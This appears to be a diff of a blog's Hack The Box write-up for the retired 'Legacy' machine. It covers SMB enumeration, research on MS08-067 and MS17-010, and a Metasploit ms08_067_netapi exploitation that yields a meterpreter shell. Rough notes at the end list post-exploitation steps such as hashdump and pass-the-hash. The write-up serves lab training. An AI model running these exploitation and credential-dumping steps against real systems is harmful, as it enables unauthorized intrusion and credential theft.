@@ -1,71 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-
-  <head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
-<title>Legacy HTB Writeup | Hi</title>
-<meta name="generator" content="Jekyll v4.1.1" />
-<meta property="og:title" content="Legacy HTB Writeup" />
-<meta name="author" content="Zack Jones" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="some of this post is still being edited. Posting draft early by request." />
-<meta property="og:description" content="some of this post is still being edited. Posting draft early by request." />
-<link rel="canonical" href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" />
-<meta property="og:url" content="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" />
-<meta property="og:site_name" content="Hi" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-05-15T18:00:00-04:00" />
-<script type="application/ld+json">
-{"datePublished":"2020-05-15T18:00:00-04:00","@type":"BlogPosting","description":"some of this post is still being edited. Posting draft early by request.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html"},"url":"http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html","author":{"@type":"Person","name":"Zack Jones"},"headline":"Legacy HTB Writeup","dateModified":"2020-05-15T18:00:00-04:00","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Hi" /></head>
-
-  <!-- Global Site Tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106768649-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments)};
-  gtag('js', new Date());
-
-  gtag('config', 'UA-106768649-1');
-</script>
-
-
-
-  <body>
-
-    <header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">Hi</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/feed/">Feed</a><a class="page-link" href="/Blog/">Blog</a><a class="page-link" href="/Cisco/">Cisco</a><a class="page-link" href="/InfoSec/">InfoSec</a><a class="page-link" href="/Linux/">Linux</a><a class="page-link" href="/networking/">Networking</a><a class="page-link" href="/Server/">Server</a></div>
-      </nav></div>
-</header>
-
-
-    <main class="page-content" aria-label="Content">
-      <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Legacy HTB Writeup</h1>
-    <p class="post-meta">
-      <time class="dt-published" datetime="2020-05-15T18:00:00-04:00" itemprop="datePublished">May 15, 2020
-      </time></p>
-  </header>
-
-  <div class="post-content e-content" itemprop="articleBody">
-    <p><em>some of this post is still being edited. Posting draft early by request.</em></p>
+I"0><p><em>some of this post is still being edited. Posting draft early by request.</em></p>
 
 <p>The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</p>
 
@@ -76,7 +9,7 @@
 <p><strong>Okay let’s get into it</strong></p>
 
 <h3 id="scanning-the-machine">Scanning the machine</h3>
-<p>So from HTB we already know the IP address is <code>10.10.10.4</code> so as long as our OpenVPN connection is setup we should be able to start banging on it.</p>
+<p>So from HTB we already know the IP address is <code>10.10.10.4</code> so as long as our openvpn connection is setup we should be able to start banging on it.</p>
 
 <p>I’m going to scan this in a few different ways. First let’s do a basic nmap.</p>
 
@@ -117,7 +50,7 @@ It’s not enough for full confidence but it’s enough to start to see where we
   <li>Evidence that it is an older Windows machine, most likely XP.</li>
   <li>Computer name is ‘Legacy’</li>
   <li>Workgroup is ‘HTB’</li>
-  <li>Maybe possible to enumerate Netbios</li>
+  <li>Maybe possible to enumerate netbios</li>
   <li>Has directory services enabled</li>
 </ul>
 
@@ -169,7 +102,7 @@ smbclient -N -L \\\10.10.10.4\\
 
 <p><img src="/assets/img/Walkthroughs/Legacy/smbclient.png" alt="smbclient" /></p>
 
-<p>We aren’t getting much from it right now and that’s okay. Let’s keep poking around.</p>
+<p>We aren’t getting much from it right now and that’s okay. Let’s keep poking around. Note that if we didn’t already know it was a windows machine, seeing <code class="language-plaintext highlighter-rouge">NT_STATUS_IO_TIMEOUT</code> is a clue that it’s windows. Remember NT generally means it’s a Windows machine.</p>
 
 <p><em>Note: smbmap is also a great tool for enumerating SMB, in paticular when working with Active Directory or domains.</em></p>
 
@@ -178,7 +111,7 @@ smbclient -N -L \\\10.10.10.4\\
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p 445 --script smb-os-discovery 10.10.10.4
 </code></pre></div></div>
 
-<p>Lastly, you should know that Metasploit has amazing auxiliary scanners. You can use Metasploit to search keywords and then go from there. You’ll find an auxiliary module called <code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_version</code> that is useful here. The steps here are basic.</p>
+<p>Lastly, you should know that Metasploit has amazing auxiliary scanners. You can use metasploit to search keywords and then go from there. You’ll find an auxiliary module called <code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_version</code> that is useful here. The steps here are basic.</p>
 <ul>
   <li><code class="language-plaintext highlighter-rouge">use</code> and the module name.</li>
   <li><code class="language-plaintext highlighter-rouge">options</code> to view what needs to be set</li>
@@ -227,25 +160,21 @@ msf5 auxiliary(scanner/smb/smb_version) &gt; run
 </ul>
 
 <p>This is pretty good information to have.</p>
-<h3 id="digging-into-the-cves">Digging into the CVEs</h3>
+<h3 id="diggin-into-the-cves">Diggin into the CVEs</h3>
 
 <p>So there are two CVEs that we noticed earlier. There are loads of ways to search these to find out more information about the machine. I always suggest doing a few different searches to find out basic information and also confirm what you’ve read. If you’re just looking at one post, you’re probably missing out on a lot of information. Below is a bit of research I did on both CVEs. I’ve included the links I felt were important as well.</p>
 
-<p>Before we hit Google, lets try a little <strong>Searchsploit</strong>… starting with <strong>CVE-2008-4250</strong></p>
+<p>Before we hit google, lets try a little <strong>searchsploit</strong>… starting with <strong>CVE-2008-4250</strong></p>
 
 <h4 id="cve-2008-4250">CVE-2008-4250</h4>
 
-<p><strong>Searchsploit</strong>
-<img src="/assets/img/Walkthroughs/Legacy/SearchSploit-MS08-067.png" alt="MS08-067 SearchSploit" /></p>
+<p><img src="/assets/img/Walkthroughs/Legacy/SearchSploit-MS08-067.png" alt="MS08-067 SearchSploit" /></p>
 
 <p>Notice that when I searched for it by CVE I got nothing. That’s why searching in different places is so important. I knew to also search MS08-067 because of this next page…</p>
 
-<p><strong>CVEDetails.com</strong></p>
-
 <p><a href="https://www.cvedetails.com/cve/CVE-2008-4250/">CVE Details link</a><br />
-<img src="/assets/img/Walkthroughs/Legacy/CVE-Details-2008-4250.png" alt="CVE Screenshot" /> <br />
-The CVE Details page always gives loads of information. Here is the take away.</p>
-
+The CVE Details page always gives loads of information. Here is the take away. 
+<img src="/assets/img/Walkthroughs/Legacy/CVE-Details-2008-4250.png" alt="CVE Screenshot" /></p>
 <ul>
   <li>Allows for Remote Code Execution - <em>Exactly what we want to hear when trying to gain initial access</em></li>
   <li>Has Metasploit Module ;)</li>
@@ -257,56 +186,32 @@ The CVE Details page always gives loads of information. Here is the take away.</
   <li>Also known as MS08-067 (This is useful for doing further research)</li>
 </ul>
 
-<p>So in theory a Metasploit module can <strong>do the work for us, get us in</strong>, and not only that but already <strong>be admin level</strong>. Note taken!</p>
+<p>So in theory a metasploit module can <strong>do the work for us, get us in</strong>, and not only that but already <strong>be admin level</strong>. Note taken!</p>
 
-<p><strong>Exploit-db.com</strong></p>
-
-<p><a href="https://www.exploit-db.com/exploits/7132">Exploit-db link</a></p>
-
-<p><img src="/assets/img/Walkthroughs/Legacy/EDB-7132.png" alt="EDB-7132" /></p>
+<p><a href="https://www.exploit-db.com/exploits/7132">Exploit-db</a></p>
 
 <p>Okay so this is literally the exploit for this particular vulnerability published online. Great. From the site we can tell that</p>
 <ul>
   <li>Is Verified by EDB to work.</li>
   <li>Written in python</li>
   <li>Has some python dependencies</li>
-  <li>Takes arguments based on which OS you’re targeting, i.e. has multiple payloads</li>
+  <li>Takes arguments based on which OS you’re targeting, ie has multiple payloads</li>
   <li>Sets up a listener on port 4444</li>
-  <li>exploit portion of the script is shellcode for a portbind that came from Metasploit.</li>
-  <li>Was listed ‘7132.py’ in our searchsploit results.</li>
+  <li>exploit portion of the script is shellcode for a portbind that came from metasploit.</li>
 </ul>
 
 <p>If our enumeration has been correct so far, this is almost a stopping point. We know the OS, SMB version, the CVE, and the exploit. And everything lines up really well. Not a lot of chances for failure here. But always keep reading before firing something off, your little copy and paste pew pew could really wreck a machine if you’re not careful.</p>
-
 <h4 id="cve-2017-0143">CVE-2017-0143</h4>
-<p>Okay so before we dig into this. Think back to 2017 and try to remember some sort of massive worldwide scare involving SMB… do you remember? Yeahhhhhh. WannaCry? This bad boy right here is also known as MS17-010. I imagine this machine could be broken into using either of these CVEs but I chased the above method. But for reference, here are some links.</p>
-
-<p>https://www.exploit-db.com/exploits/41891<br />
-https://www.cvedetails.com/cve/CVE-2017-0143/</p>
-
 <h4 id="exploitation-and-gaining-access">Exploitation and Gaining Access</h4>
 
-<p><strong>Trying out CVE-2008-4250 aka MS08-067</strong></p>
-
-<p>So this exploit has two methods, Metasploit and of course finding the exploit online. Or I mean… if you’re a big shot, maybe develop your own exploit.</p>
+<p><strong>Trying out CVE-2008-4250 aka MS08-067</strong>
+So this exploit has two methods, metasploit and of course finding the exploit online. Or I mean… if you’re a big shot, maybe develop your own exploit.</p>
 
 <h4 id="manual-exploit">Manual Exploit</h4>
-<blockquote>
-  <p>Adding this section soon</p>
-</blockquote>
 
 <h4 id="metasploit">Metasploit</h4>
-<p>After I saw that Metasploit was an option here, I quickly fired a Metasploit missile at this silly boy. You can use the search function in Metasploit to find a module called <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms08_067_netapi</code>. It was super easy to run. Note that sometimes exploits revolving around MS08-067 and MS17-010 can be finicky. You might have to try it a couple times. Here is what it looked like in Metasploit.</p>
 
-<ul>
-  <li>Search for the exploit</li>
-  <li>use the <code class="language-plaintext highlighter-rouge">use</code> command and the name of the exploit</li>
-  <li>check the options with <code class="language-plaintext highlighter-rouge">options</code></li>
-  <li>set necessary <code class="language-plaintext highlighter-rouge">options</code></li>
-  <li><code class="language-plaintext highlighter-rouge">run</code></li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; use exploit/windows/smb/ms08_067_netapi
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary(scanner/smb/smb_version) &gt; use exploit/windows/smb/ms08_067_netapi
 msf5 exploit(windows/smb/ms08_067_netapi) &gt; options
 
 Module options (exploit/windows/smb/ms08_067_netapi):
@@ -340,47 +245,55 @@ msf5 exploit(windows/smb/ms08_067_netapi) &gt; run
 meterpreter &gt;
 </code></pre></div></div>
 
-<p>Boom you’ve got a meterpreter shell and if you check, you’re big boy admin with all the rights in the world. Yes this hack was pretty easy, yes it’s based off of a massive vulnerability that hit the news which means every IT guy and gal across the globe knows about it and hopefully that means they are all patched up. But. That is wishful thinking. I have to say the biggest value in this is that is was a really rewarding hack. It was my first HTB and for a lot of folks reading this, it’s probably theirs as well. Or… it should be I would say. There is massive value in doing easy boxes like this for your confidence. It gives so much momentum that tackling harder boxes are just a little bit less scary. SO. That’s it. I hope this helps. If I said something stupid or lied or anything else, feel free to reach out.<br />
- Twitter - <a href="https://twitter.com/mehhsecurity">@mehhsecurity</a><br />
- Email is <strong>hi.imzackjones@gmail.com</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PAST THIS POINT IS ROUGH NOTES. POST NOT COMPLETED
+</code></pre></div></div>
 
-<p>Cheers, 
-Zack.</p>
+<hr />
+<hr />
 
+<p>metasploit scanning enum</p>
 
-  </div><a class="u-url" href="/infosec/2020/05/15/Legacy-HTB-Writeup.html" hidden></a>
-</article>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 
-      </div>
-    </main>
+Find version and look for exploits online. 
 
-    <footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
+Doesn't find much. Hope that Old OS just have vulns
 
-  <div class="wrapper">
+Search google for exploits. 
 
-    <h2 class="footer-heading">Hi</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">Zack Jones</li><li><a class="u-email" href="mailto:hi.imzackjones@gmail.com">hi.imzackjones@gmail.com</a></li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/hiimzackjones"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">hiimzackjones</span></a></li><li><a href="https://www.twitter.com/mehhsecurity"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">mehhsecurity</span></a></li></ul>
-</div>
-
-      <div class="footer-col footer-col-3">
-        <p>A very Mehh Networking and Cybersecurity online notebook and blog.
-</p>
-      </div>
-    </div>
-
-  </div>
-
-</footer>
+</code></pre></div></div>
+<p>ms08-067 - SMB Windows XP service pack 3 vuln.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 
 
-  </body>
+You can also use the PoC script and modify it to work and use that manually. 
 
-</html>
+### post exploit
+
+check user. and system info (these are meterpreter commands)
+
+</code></pre></div></div>
+<p>getuid
+then
+sysinfo</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+you can do a hashdump to get the usernames and passwords for cracking later 
+
+</code></pre></div></div>
+<p>hashdump</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+you can do pass the hash stuff as well. 
+
+you can navigate the machine with 
+
+</code></pre></div></div>
+<p>shell</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Get the user and root.txt files
+
+to cat out a file you use 
+
+</code></pre></div></div>
+<p>type filename.txt
+```</p>
+:ET
